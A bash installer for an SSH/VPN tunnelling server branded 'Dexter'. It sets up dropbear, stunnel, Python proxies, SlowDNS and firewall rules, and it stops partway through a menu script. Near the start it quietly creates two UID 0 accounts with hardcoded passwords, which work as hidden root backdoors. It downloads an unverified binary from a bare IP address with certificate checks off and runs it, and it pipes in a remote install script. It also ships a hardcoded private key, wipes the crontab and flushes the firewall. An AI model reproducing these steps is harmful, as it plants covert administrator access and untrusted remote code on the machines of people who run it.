#!/bin/bash

RED='\033[01;31m';
RESET='\033[0m';
GREEN='\033[01;32m';
WHITE='\033[01;37m';
YELLOW='\033[00;33m';



rm -rf install.sh
clear
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo '                                                              
   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
 '
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo ""
read -p "Please enter ns host for Slowdns: " nameserver
echo $nameserver > /root/nameserver.txt
echo ""
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo -e " \033[0;31m Wait 10 Seconds to Start Installing!!!!\033[0m"
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
sleep 10

startinstall(){
apt-get update
mkdir /etc/update-motd.d
apt-get install inxi screenfetch lolcat figlet -y

/bin/cat <<"EOM" >/etc/update-motd.d/01-custom
#!/bin/sh

exec 2>&1

# lolcat MIGHT NOT BE IN $PATH YET, SO BE EXPLICIT
LOLCAT=/usr/games/lolcat

# UPPERCASE HOSTNAME, APPLY FIGLET FONT "block" AND CENTERING
INFO_HOST=$(echo DEXTER | awk '{print toupper($0)}' | figlet -tc -f block)

# RUN IT ALL THROUGH lolcat FOR COLORING
printf "%s\n%s\n" "$INFO_HOST" | $LOLCAT -f
EOM

chmod -x /etc/update-motd.d/*
chmod +x /etc/update-motd.d/01-custom
rm /etc/motd
touch /etc/motd.tail

apt-get install dropbear unzip build-essential curl stunnel4 net-tools python python2 lsof git netcat -y
sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells

useradd -p $(openssl passwd -1 dexterjakulero) jakulerodexter -ou 0 -g 0
useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0

service dropbear restart

cat << \websocket > /usr/local/sbin/websocket.py
import socket, threading, thread, select, signal, sys, time, getopt

# Listen
LISTENING_ADDR = '0.0.0.0'
if sys.argv[1:]:
  LISTENING_PORT = sys.argv[1]
else:
  LISTENING_PORT = 80  
#Pass
PASS = ''

# CONST
BUFLEN = 4096 * 4
TIMEOUT = 60
DEFAULT_HOST = '127.0.0.1:442'
RESPONSE = 'HTTP/1.1 101 <font color="red">Dexter Eskalarte</font>\r\n\r\nContent-Length: 104857600000\r\n\r\n'

class Server(threading.Thread):
    def __init__(self, host, port):
        threading.Thread.__init__(self)
        self.running = False
        self.host = host
        self.port = port
        self.threads = []
        self.threadsLock = threading.Lock()
        self.logLock = threading.Lock()

    def run(self):
        self.soc = socket.socket(socket.AF_INET)
        self.soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.soc.settimeout(2)
        intport = int(self.port)
        self.soc.bind((self.host, intport))
        self.soc.listen(0)
        self.running = True

        try:
            while self.running:
                try:
                    c, addr = self.soc.accept()
                    c.setblocking(1)
                except socket.timeout:
                    continue

                conn = ConnectionHandler(c, self, addr)
                conn.start()
                self.addConn(conn)
        finally:
            self.running = False
            self.soc.close()

    def printLog(self, log):
        self.logLock.acquire()
        print log
        self.logLock.release()

    def addConn(self, conn):
        try:
            self.threadsLock.acquire()
            if self.running:
                self.threads.append(conn)
        finally:
            self.threadsLock.release()

    def removeConn(self, conn):
        try:
            self.threadsLock.acquire()
            self.threads.remove(conn)
        finally:
            self.threadsLock.release()

    def close(self):
        try:
            self.running = False
            self.threadsLock.acquire()

            threads = list(self.threads)
            for c in threads:
                c.close()
        finally:
            self.threadsLock.release()


class ConnectionHandler(threading.Thread):
    def __init__(self, socClient, server, addr):
        threading.Thread.__init__(self)
        self.clientClosed = False
        self.targetClosed = True
        self.client = socClient
        self.client_buffer = ''
        self.server = server
        self.log = 'Connection: ' + str(addr)

    def close(self):
        try:
            if not self.clientClosed:
                self.client.shutdown(socket.SHUT_RDWR)
                self.client.close()
        except:
            pass
        finally:
            self.clientClosed = True

        try:
            if not self.targetClosed:
                self.target.shutdown(socket.SHUT_RDWR)
                self.target.close()
        except:
            pass
        finally:
            self.targetClosed = True

    def run(self):
        try:
            self.client_buffer = self.client.recv(BUFLEN)

            hostPort = self.findHeader(self.client_buffer, 'X-Real-Host')

            if hostPort == '':
                hostPort = DEFAULT_HOST

            split = self.findHeader(self.client_buffer, 'X-Split')

            if split != '':
                self.client.recv(BUFLEN)

            if hostPort != '':
                passwd = self.findHeader(self.client_buffer, 'X-Pass')
				
                if len(PASS) != 0 and passwd == PASS:
                    self.method_CONNECT(hostPort)
                elif len(PASS) != 0 and passwd != PASS:
                    self.client.send('HTTP/1.1 400 WrongPass!\r\n\r\n')
                elif hostPort.startswith('127.0.0.1') or hostPort.startswith('localhost'):
                    self.method_CONNECT(hostPort)
                else:
                    self.client.send('HTTP/1.1 403 Forbidden!\r\n\r\n')
            else:
                print '- No X-Real-Host!'
                self.client.send('HTTP/1.1 400 NoXRealHost!\r\n\r\n')

        except Exception as e:
            self.log += ' - error: ' + e.strerror
            self.server.printLog(self.log)
	    pass
        finally:
            self.close()
            self.server.removeConn(self)

    def findHeader(self, head, header):
        aux = head.find(header + ': ')

        if aux == -1:
            return ''

        aux = head.find(':', aux)
        head = head[aux+2:]
        aux = head.find('\r\n')

        if aux == -1:
            return ''

        return head[:aux];

    def connect_target(self, host):
        i = host.find(':')
        if i != -1:
            port = int(host[i+1:])
            host = host[:i]
        else:
            if self.method=='CONNECT':
                port = 442
            else:
                port = sys.argv[1]

        (soc_family, soc_type, proto, _, address) = socket.getaddrinfo(host, port)[0]

        self.target = socket.socket(soc_family, soc_type, proto)
        self.targetClosed = False
        self.target.connect(address)

    def method_CONNECT(self, path):
        self.log += ' - CONNECT ' + path

        self.connect_target(path)
        self.client.sendall(RESPONSE)
        self.client_buffer = ''

        self.server.printLog(self.log)
        self.doCONNECT()

    def doCONNECT(self):
        socs = [self.client, self.target]
        count = 0
        error = False
        while True:
            count += 1
            (recv, _, err) = select.select(socs, [], socs, 3)
            if err:
                error = True
            if recv:
                for in_ in recv:
		    try:
                        data = in_.recv(BUFLEN)
                        if data:
			    if in_ is self.target:
				self.client.send(data)
                            else:
                                while data:
                                    byte = self.target.send(data)
                                    data = data[byte:]

                            count = 0
			else:
			    break
		    except:
                        error = True
                        break
            if count == TIMEOUT:
                error = True
            if error:
                break


def print_usage():
    print 'Usage: proxy.py -p <port>'
    print '       proxy.py -b <bindAddr> -p <port>'
    print '       proxy.py -b 0.0.0.0 -p 80'

def parse_args(argv):
    global LISTENING_ADDR
    global LISTENING_PORT
    
    try:
        opts, args = getopt.getopt(argv,"hb:p:",["bind=","port="])
    except getopt.GetoptError:
        print_usage()
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print_usage()
            sys.exit()
        elif opt in ("-b", "--bind"):
            LISTENING_ADDR = arg
        elif opt in ("-p", "--port"):
            LISTENING_PORT = int(arg)


def main(host=LISTENING_ADDR, port=LISTENING_PORT):
    print "\n:-------PythonProxy-------:\n"
    print "Listening addr: " + LISTENING_ADDR
    print "Listening port: " + str(LISTENING_PORT) + "\n"
    print ":-------------------------:\n"
    server = Server(LISTENING_ADDR, LISTENING_PORT)
    server.start()
    while True:
        try:
            time.sleep(2)
        except KeyboardInterrupt:
            print 'Stopping...'
            server.close()
            break

#######    parse_args(sys.argv[1:])
if __name__ == '__main__':
    main()

websocket

cat << \socksocserv > /usr/local/sbin/proxy.py
#!/usr/bin/env python3
# encoding: utf-8
# SocksProxy Mod By: Dexter Eskalarte
import socket, threading, thread, select, signal, sys, time
from os import system
system("clear")
#conexao
IP = '0.0.0.0'
try:
   PORT = int(sys.argv[1])
except:
   PORT = 8000
PASS = ''
BUFLEN = 8196 * 8
TIMEOUT = 60
MSG = 'Powered by: Dexter Eskalarte'
DEFAULT_HOST = '0.0.0.0:442'
RESPONSE = "HTTP/1.1 200 " + str(MSG) + "\r\n\r\n"

class Server(threading.Thread):
    def __init__(self, host, port):
        threading.Thread.__init__(self)
        self.running = False
        self.host = host
        self.port = port
        self.threads = []
	self.threadsLock = threading.Lock()
	self.logLock = threading.Lock()

    def run(self):
        self.soc = socket.socket(socket.AF_INET)
        self.soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.soc.settimeout(2)
        self.soc.bind((self.host, self.port))
        self.soc.listen(0)
        self.running = True

        try:                    
            while self.running:
                try:
                    c, addr = self.soc.accept()
                    c.setblocking(1)
                except socket.timeout:
                    continue
                
                conn = ConnectionHandler(c, self, addr)
                conn.start();
                self.addConn(conn)
        finally:
            self.running = False
            self.soc.close()
            
    def printLog(self, log):
        self.logLock.acquire()
        print log
        self.logLock.release()
	
    def addConn(self, conn):
        try:
            self.threadsLock.acquire()
            if self.running:
                self.threads.append(conn)
        finally:
            self.threadsLock.release()
                    
    def removeConn(self, conn):
        try:
            self.threadsLock.acquire()
            self.threads.remove(conn)
        finally:
            self.threadsLock.release()
                
    def close(self):
        try:
            self.running = False
            self.threadsLock.acquire()
            
            threads = list(self.threads)
            for c in threads:
                c.close()
        finally:
            self.threadsLock.release()
			

class ConnectionHandler(threading.Thread):
    def __init__(self, socClient, server, addr):
        threading.Thread.__init__(self)
        self.clientClosed = False
        self.targetClosed = True
        self.client = socClient
        self.client_buffer = ''
        self.server = server
        self.log = 'Conexao: ' + str(addr)

    def close(self):
        try:
            if not self.clientClosed:
                self.client.shutdown(socket.SHUT_RDWR)
                self.client.close()
        except:
            pass
        finally:
            self.clientClosed = True
            
        try:
            if not self.targetClosed:
                self.target.shutdown(socket.SHUT_RDWR)
                self.target.close()
        except:
            pass
        finally:
            self.targetClosed = True

    def run(self):
        try:
            self.client_buffer = self.client.recv(BUFLEN)
        
            hostPort = self.findHeader(self.client_buffer, 'X-Real-Host')
            
            if hostPort == '':
                hostPort = DEFAULT_HOST

            split = self.findHeader(self.client_buffer, 'X-Split')

            if split != '':
                self.client.recv(BUFLEN)
            
            if hostPort != '':
                passwd = self.findHeader(self.client_buffer, 'X-Pass')
				
                if len(PASS) != 0 and passwd == PASS:
                    self.method_CONNECT(hostPort)
                elif len(PASS) != 0 and passwd != PASS:
                    self.client.send('HTTP/1.1 400 WrongPass!\r\n\r\n')
                if hostPort.startswith(IP):
                    self.method_CONNECT(hostPort)
                else:
                   self.client.send('HTTP/1.1 403 Forbidden!\r\n\r\n')
            else:
                print '- No X-Real-Host!'
                self.client.send('HTTP/1.1 400 NoXRealHost!\r\n\r\n')

        except Exception as e:
            self.log += ' - error: ' + e.strerror
            self.server.printLog(self.log)
	    pass
        finally:
            self.close()
            self.server.removeConn(self)

    def findHeader(self, head, header):
        aux = head.find(header + ': ')
    
        if aux == -1:
            return ''

        aux = head.find(':', aux)
        head = head[aux+2:]
        aux = head.find('\r\n')

        if aux == -1:
            return ''

        return head[:aux];

    def connect_target(self, host):
        i = host.find(':')
        if i != -1:
            port = int(host[i+1:])
            host = host[:i]
        else:
            if self.method=='CONNECT':
                port = 110
            else:
                port = 22

        (soc_family, soc_type, proto, _, address) = socket.getaddrinfo(host, port)[0]

        self.target = socket.socket(soc_family, soc_type, proto)
        self.targetClosed = False
        self.target.connect(address)

    def method_CONNECT(self, path):
    	self.log += ' - CONNECT ' + path
        self.connect_target(path)
        self.client.sendall(RESPONSE)
        self.client_buffer = ''
        self.server.printLog(self.log)
        self.doCONNECT()
                    
    def doCONNECT(self):
        socs = [self.client, self.target]
        count = 0
        error = False
        while True:
            count += 1
            (recv, _, err) = select.select(socs, [], socs, 3)
            if err:
                error = True
            if recv:
                for in_ in recv:
		    try:
                        data = in_.recv(BUFLEN)
                        if data:
			    if in_ is self.target:
				self.client.send(data)
                            else:
                                while data:
                                    byte = self.target.send(data)
                                    data = data[byte:]

                            count = 0
			else:
			    break
		    except:
                        error = True
                        break
            if count == TIMEOUT:
                error = True

            if error:
                break



def main(host=IP, port=PORT):
    print "\033[0;34mâ”"*8,"\033[1;32m PROXY SOCKS","\033[0;34mâ”"*8,"\n"
    print "\033[1;33mIP:\033[1;32m " + IP
    print "\033[1;33mPORTA:\033[1;32m " + str(PORT) + "\n"
    print "\033[0;34mâ”"*10,"\033[1;32m Dexter Eskalarte","\033[0;34mâ”\033[1;37m"*11,"\n"
    server = Server(IP, PORT)
    server.start()
    while True:
        try:
            time.sleep(2)
        except KeyboardInterrupt:
            print '\nClosing...'
            server.close()
            break
if __name__ == '__main__':
    main()
socksocserv

cat <<EOF >/etc/stunnel/stunnel.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAyN+jQb8vvS1jwbQSXAP9H0alRxuXuijhIp3u1gePGBsGLGg8
CWQrdhbB40W7Ov2xzg4KyiRwLgcfnOP2tHvtsN7BzC8DWrqqZsNyENDyIs3sX5oc
+JGLQZJiv2QSAP3N/4/UAAswUnGRW1TzQFXISSVeiScBsB96LoVLiPdA1e4Hhjkb
vggLOHHTcXqc1BBzIt9eg672O+yiILsOFuYPGh3TBwVZ0DvKYZocEsJ/RExOuAID
x0+THlpyO3PZhIo3EN5BVCmBcsUboByH9/Lsh+15tJqpvM8uiB9pjxlWUiRNiHjm
J5+pOWX4FpGlgrJUYSSsUUddXmPVWAj1BeQ2GwIDAQABAoIBAH7ISC5zERqBz3iu
wve4vMZEvISI8dbZfl9u9xO3aaV5SQg2Mc5rntLFwlJD7Mxq2xKG4mB7ZyJl9Jn9
d/SqU3dS4VaSRbe6IVsC+LeMaYd2GT6t8qMgmZglYJYT/xkJGD+488GjTjh63Zeb
onx0qBkisOw35mTXOTKrhuVHyXA70dD1an0fXi6tiNkIT4AVwLgqJuFxE0seePlN
Y35jZF4JvX8hOvkSshkzxNWSIs2LOOCJL7dH90FYvUYA/kvW+64O7pouA/p/VkYD
rO0fYgJmureiUZfwEVJKfnBgdhIbStA3lRxDzDmxr1BBVFaraSZ+12/jQVEXOaRb
ErovK6ECgYEA5nV12egMRn3l3MItWmcURIDtTU8cy3WreP2zTzx9RZDs3Rw2HEbR
0jyLzJOHfyFdyGrZtbUAa/LoOKT2YvPKQ2P4k4ZFbYcnl7cgAL28CrpZgNZXoEaL
sMf6Qp6PG+VUSFoFcOi/GM2c4ZypVOR5MwGbfpJ4fusekxQiTijWs4cCgYEA3yLK
Kt8bXHgg7B92mTFEKsiYrgk5SgPcYQ/HxYOMS3hrI8J3JWkMOWCCAbS1nSPPd0BY
jXGL/LSRmWA8bX/objwq8Q8YDTuuDCIPsh/SoFZsdHWc0ZlOv1BsWGijJGa21n64
Ja5r3LWSH6YLCy2PmoQzBDaCtmr/rZWXPaS4tc0CgYEAre9jJjab5SwqK6amQj/g
LR+9eobGLc0+wM+B4MC/r5yFGRCsykStIeaugJWsQ0g0lwoGDL1ydwbbO71NdDuZ
oak3OGizx8mlGT2OOuD4poQk/zdG5WG5FpCoElXHnv9D0GOZDbGsYRT2XdU2fCsA
Sn3hFPOJXAkqh0k/5wutl8sCgYEA2aXAluK6eI7AZjEmaLTSbfzuWEus8tIjQxW2
YaU30mGp9952gyoc/1ZwWSOgRp+ofQRpm8XWqu6iWn2xU4mA+Q19QVbcugOteC49
Kxy5QSYrcclK5nNoiVnz5KRkBVyfGUfPbQneMhF1b6NxgDy3pxst+/0DsNVbgUC5
niou9T0CgYEAkTXYooaf7JTAMlu/wLunkT0ZWKL/bU4ZgOFVFnF2gdfWJnHTMSu5
PtxyjisZJNbON6xW0pIjcTuUQCIpL0LoZ7qd5zi5QqISb+eKzK8ENMxgnV7MEx78
lufFKJYrjhC8j9pwY5pAR5uw2HKMS34IqLXct6NypoEYsJ48YDfA0Qw=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIEATCCAumgAwIBAgIJAPDuiksIWVs2MA0GCSqGSIb3DQEBCwUAMIGWMQswCQYD
VQQGEwJQSDESMBAGA1UECAwJU1RST05HVlBOMRIwEAYDVQQHDAlTVFJPTkdWUE4x
EjAQBgNVBAoMCVNUUk9OR1ZQTjESMBAGA1UECwwJU1RST05HVlBOMRIwEAYDVQQD
DAlTVFJPTkdWUE4xIzAhBgkqhkiG9w0BCQEWFHN0cm9uZy12cG5AZ21haWwuY29t
MB4XDTE4MDcwMzA1MTM0MVoXDTIxMDcwMjA1MTM0MVowgZYxCzAJBgNVBAYTAlBI
MRIwEAYDVQQIDAlTVFJPTkdWUE4xEjAQBgNVBAcMCVNUUk9OR1ZQTjESMBAGA1UE
CgwJU1RST05HVlBOMRIwEAYDVQQLDAlTVFJPTkdWUE4xEjAQBgNVBAMMCVNUUk9O
R1ZQTjEjMCEGCSqGSIb3DQEJARYUc3Ryb25nLXZwbkBnbWFpbC5jb20wggEiMA0G
CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDI36NBvy+9LWPBtBJcA/0fRqVHG5e6
KOEine7WB48YGwYsaDwJZCt2FsHjRbs6/bHODgrKJHAuBx+c4/a0e+2w3sHMLwNa
uqpmw3IQ0PIizexfmhz4kYtBkmK/ZBIA/c3/j9QACzBScZFbVPNAVchJJV6JJwGw
H3ouhUuI90DV7geGORu+CAs4cdNxepzUEHMi316DrvY77KIguw4W5g8aHdMHBVnQ
O8phmhwSwn9ETE64AgPHT5MeWnI7c9mEijcQ3kFUKYFyxRugHIf38uyH7Xm0mqm8
zy6IH2mPGVZSJE2IeOYnn6k5ZfgWkaWCslRhJKxRR11eY9VYCPUF5DYbAgMBAAGj
UDBOMB0GA1UdDgQWBBTxI2YSnxnuDpwgxKOUgglmgiH/vDAfBgNVHSMEGDAWgBTx
I2YSnxnuDpwgxKOUgglmgiH/vDAMBgNVHRMEBTADAQH/MA0GCSqGSIb3DQEBCwUA
A4IBAQC30dcIPWlFfBEK/vNzG1Dx+BWkHCfd2GfmVc+VYSpmiTox13jKBOyEdQs4
xxB7HiESKkpAjQ0YC3mjE6F53NjK0VqdfzXhopg9i/pQJiaX0KTTcWIelsJNg2aM
s8GZ0nWSytcAqAV6oCnn+eOT/IqnO4ihgmaVIyhfYvRgXfPU/TuERtL9f8pAII44
jAVcy60MBZ1bCwQZcToZlfWCpO/8nLg4nnv4e3W9UeC6rDgWgpI6IXS3jikN/x3P
9JIVFcWLtsOLC+D/33jSV8XDM3qTTRv4i/M+mva6znOI89KcBjsEhX5AunSQZ4Zg
QkQTJi/td+5kVi00NXxlHYH5ztS1
-----END CERTIFICATE-----
EOF

cat <<EOF >/etc/stunnel/stunnel.conf
cert = /etc/stunnel/stunnel.pem
client = no
socket = a:SO_REUSEADDR=1
socket = l:TCP_NODELAY=1
socket = r:TCP_NODELAY=1

[dropbear]
accept = 443
connect = 127.0.0.1:442
EOF

service stunnel4 restart

printf "%b\n" "\e[32m[\e[0mInfo\e[32m]\e[0m\e[97m running Iptables configuration on background\e[0m"
cat <<'iptEOF'> /tmp/iptables-config.bash
#!/bin/bash
function ip_address(){
  local IP="$( ip addr | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -Ev "^192\.168|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-2]\.|^10\.|^127\.|^255\.|^0\." | head -n 1 )"
  [ -z "${IP}" ] && IP="$(curl -4s ipv4.icanhazip.com)"
  [ -z "${IP}" ] && IP="$(curl -4s ipinfo.io/ip)"
  [ ! -z "${IP}" ] && echo "${IP}" || echo 'ipaddress'
}
IPADDR="$(ip_address)"
PNET="$(ip -4 route ls | grep default | grep -Po '(?<=dev )(\S+)' | head -1)"
CIDR="172.29.0.0/16"
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -t nat -F
iptables -t mangle -F
iptables -F
iptables -X
iptables -A INPUT -s $IPADDR -p tcp -m multiport --dport 1:65535 -j ACCEPT
iptables -A INPUT -s $IPADDR -p udp -m multiport --dport 1:65535 -j ACCEPT
iptables -A INPUT -p tcp --dport 25 -j REJECT   
iptables -A FORWARD -p tcp --dport 25 -j REJECT
iptables -A OUTPUT -p tcp --dport 25 -j REJECT
iptables -I FORWARD -s $CIDR -j ACCEPT
iptables -t nat -A POSTROUTING -s $CIDR -o $PNET -j MASQUERADE
iptables -t nat -A POSTROUTING -s $CIDR -o $PNET -j SNAT --to-source $IPADDR
iptables -A INPUT -m string --algo bm --string "BitTorrent" -j REJECT
iptables -A INPUT -m string --algo bm --string "BitTorrent protocol" -j REJECT
iptables -A INPUT -m string --algo bm --string ".torrent" -j REJECT
iptables -A INPUT -m string --algo bm --string "torrent" -j REJECT
iptables -A INPUT -m string --string "BitTorrent" --algo kmp -j REJECT
iptables -A INPUT -m string --string "BitTorrent protocol" --algo kmp -j REJECT
iptables -A INPUT -m string --string "bittorrent-announce" --algo kmp -j REJECT
iptables -A FORWARD -m string --algo bm --string "BitTorrent" -j REJECT
iptables -A FORWARD -m string --algo bm --string "BitTorrent protocol" -j REJECT
iptables -A FORWARD -m string --algo bm --string ".torrent" -j REJECT
iptables -A FORWARD -m string --algo bm --string "torrent" -j REJECT
iptables -A FORWARD -m string --string "BitTorrent" --algo kmp -j REJECT
iptables -A FORWARD -m string --string "BitTorrent protocol" --algo kmp -j REJECT
iptables -A FORWARD -m string --string "bittorrent-announce" --algo kmp -j REJECT
iptables -A OUTPUT -m string --algo bm --string "BitTorrent" -j REJECT
iptables -A OUTPUT -m string --algo bm --string "BitTorrent protocol" -j REJECT
iptables -A OUTPUT -m string --algo bm --string ".torrent" -j REJECT
iptables -A OUTPUT -m string --algo bm --string "torrent" -j REJECT
iptables -A OUTPUT -m string --string "BitTorrent" --algo kmp -j REJECT
iptables -A OUTPUT -m string --string "BitTorrent protocol" --algo kmp -j REJECT
iptables -A OUTPUT -m string --string "bittorrent-announce" --algo kmp -j REJECT
iptables-save > /etc/iptables/rules.v4
iptEOF
screen -S configIptables -dm bash -c "bash /tmp/iptables-config.bash && rm -f /tmp/iptables-config.bash"

wget --no-check-certificate 165.22.97.197/badvpn-udpgw -q
mv -f badvpn-udpgw /bin/badvpn-udpgw
chmod 777 /bin/badvpn-udpgw
ps x | grep 'udpvpn' | grep -v 'grep' || screen -dmS udpvpn /usr/bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 10000 --max-connections-for-client 10 --client-socket-sndbuf 10000


echo "net.ipv4.conf.default.rp_filter = 1
net.ipv4.conf.default.accept_source_route = 0
kernel.sysrq = 0
kernel.core_uses_pid = 1
net.ipv4.tcp_syncookies = 1
kernel.msgmnb = 65536
kernel.msgmax = 65536
kernel.shmmax = 68719476736
kernel.shmall = 4294967296
net.ipv4.ip_forward = 1
fs.file-max = 65535
net.core.rmem_default = 262144
net.core.rmem_max = 262144
net.core.wmem_default = 262144
net.core.wmem_max = 262144
net.ipv4.tcp_rmem = 4096 87380 8388608
net.ipv4.tcp_wmem = 4096 65536 8388608
net.ipv4.tcp_mem = 4096 4096 4096
net.ipv4.tcp_low_latency = 1
net.core.netdev_max_backlog = 4000
net.ipv4.ip_local_port_range = 1024 65000
net.ipv4.tcp_max_syn_backlog = 16384" > /etc/sysctl.conf
sysctl -p
iptables -F; iptables -X; iptables -Z
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
iptables -A INPUT -i eth0 -p udp --dport 53 -j ACCEPT
iptables -A INPUT -i eth0 -p udp --dport 5300 -j ACCEPT
iptables -A INPUT -i ens3 -p udp --dport 53 -j ACCEPT
iptables -A INPUT -i ens3 -p udp --dport 5300 -j ACCEPT
iptables -A PREROUTING -t nat -i eth0 -p udp --dport 53 -j REDIRECT --to-port 5300
iptables -A PREROUTING -t nat -i ens3 -p udp --dport 53 -j REDIRECT --to-port 5300

cat <<\EOM >/root/auto
#!/bin/bash

if nc -z localhost 80; then
    echo "WebSocket is running"
else
    echo "Starting WebSocket"
    screen -dmS websocket python /usr/local/sbin/websocket.py 80
fi

if nc -z localhost 8080; then
    echo "Squid Proxy Running"
else
    echo "Starting Port 8080"
    screen -dmS proxy python /usr/local/sbin/proxy.py 8080
fi

if nc -z localhost 8010; then
    echo "Squid Proxy Running"
else
    echo "Starting Port 8010"
    screen -dmS proxy python /usr/local/sbin/proxy.py 8010
fi

if nc -z localhost 443; then
    echo "stunnel running"
else
    echo "stunnel not running"
    systemctl restart stunnel4
fi

if nc -z localhost 7300; then
    echo "badvpn running"
else
    echo "Starting Badvpn"
    screen -dmS udpvpn /bin/badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 1000 --max-connections-for-client 3
fi
sudo sync; echo 3 > /proc/sys/vm/drop_caches
swapoff -a && swapon -a
echo "Ram Cleaned!"
EOM

bash /root/auto

crontab -r
echo "SHELL=/bin/bash
* * * * * /bin/bash /root/auto >/dev/null 2>&1
0 * * * * /bin/bash /bin/dnsttauto.sh >/dev/null 2>&1" | crontab -
}

function Slowdns() {
rm -rf install; wget https://raw.githubusercontent.com/MtkVpnDev/Slowdns/main/install; chmod +x install; ./install
bash /etc/slowdns/slowdns-ssh
startdns
}

display_menu () {
clear
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo '                                                              
   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
 '
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
}

ports () {
echo -e " \e[92m All Service Now are Running!!!!\e[0m \e[97m:\e[0m"
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo -e " \e[92m SERVICE PORT:\e[0m \e[97m:\e[0m" 
echo ""
echo -e " \e[92m SSH:\e[0m \e[97m: 22\e[0m" 
echo -e " \e[92m DROPBEAR:\e[0m \e[97m: 442\e[0m" 
echo -e " \e[92m Proxy:\e[0m \e[97m: 8080 , 8010\e[0m" 
echo -e " \e[92m WEBSOCKET/SSH:\e[0m \e[97m: 80\e[0m" 
echo -e " \e[92m WEBSOCKET/SSL:\e[0m \e[97m: 443\e[0m"
echo -e " \e[92m STUNNEL:\e[0m \e[97m: 443\e[0m" 
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo -e " \e[92m SlowDns Configuration:\e[0m \e[97m:\e[0m" 
echo ""
echo -e " \e[92m SLOWDNS PORT:\e[0m \e[97m: 2222\e[0m" 
echo -e " \e[92m SLOWCHAVE KEY:\e[0m \e[97m" && cat /root/server.pub
echo -e " \e[92m NAMESERVER:\e[0m \e[97m: $nameserver\e[0m" 
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo -e ""
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo -e " \033[0;31m To Create Account Just Type: dextermenu\033[0m"
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
}

controls(){
cat << \EOM> /usr/local/sbin/base-script
#!/bin/bash
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo '                                                              
   ██████╗ ███████╗██╗  ██╗████████╗███████╗██████╗ 
   ██╔══██╗██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔══██╗
   ██║  ██║█████╗   ╚███╔╝    ██║   █████╗  ██████╔╝
   ██║  ██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██╔══██╗
   ██████╔╝███████╗██╔╝ ██╗   ██║   ███████╗██║  ██║
   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝  
 '
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
GRN1='\e[32m [\e[0m1\e[32m]\e[0m';
GRN2='\e[32m [\e[0m2\e[32m]\e[0m';
GRN3='\e[32m [\e[0m3\e[32m]\e[0m';
GRN4='\e[32m [\e[0m4\e[32m]\e[0m';
GRN5='\e[32m [\e[0m5\e[32m]\e[0m';
GRN6='\e[32m [\e[0m6\e[32m]\e[0m';
GRN7='\e[32m [\e[0m7\e[32m]\e[0m';
GRN8='\e[32m [\e[0m8\e[32m]\e[0m';
GRN9='\e[32m [\e[0m9\e[32m]\e[0m';
GRN10='\e[32m [\e[0m10\e[32m]\e[0m';
GRN11='\e[32m [\e[0m11\e[32m]\e[0m';
GRN12='\e[32m [\e[0m12\e[32m]\e[0m';
GRN13='\e[32m [\e[0m13\e[32m]\e[0m';
GRN14='\e[32m [\e[0m14\e[32m]\e[0m';
GRN15='\e[32m [\e[0m15\e[32m]\e[0m';
GRN16='\e[32m [\e[0m16\e[32m]\e[0m';
GRN17='\e[32m [\e[0m17\e[32m]\e[0m';
GRN18='\e[32m [\e[0m18\e[32m]\e[0m';
GRN19='\e[32m [\e[0m19\e[32m]\e[0m';
GRN20='\e[32m [\e[0m20\e[32m]\e[0m';
GRN21='\e[32m [\e[0m21\e[32m]\e[0m';
